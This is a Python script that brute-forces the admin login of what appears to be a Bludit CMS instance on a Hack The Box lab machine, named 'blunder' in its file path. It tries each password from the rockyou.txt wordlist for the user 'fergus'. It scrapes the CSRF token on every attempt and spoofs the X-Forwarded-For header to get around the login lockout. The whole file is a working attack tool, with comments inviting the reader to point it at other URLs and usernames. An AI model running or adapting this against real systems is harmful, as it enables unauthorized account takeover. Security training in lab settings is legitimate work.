#!/usr/bin/env python3
# this script uses f-strings and should be run with python >= 3.6
import re
import requests

host = "http://10.10.10.191" # change to the appropriate URL

login_url = host + '/admin/'
username = 'fergus' # Change to the appropriate username
filename = "/home/n0w4n/ctf/htb/blunder/rockyou.txt" #change this to the appropriate file you can specify the full path to the file
wordlist = []

wordlist = [line.rstrip('\n') for line in open(filename, encoding = 'ISO-8859-1')] # encoding for rockyou.txt and strips \n

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
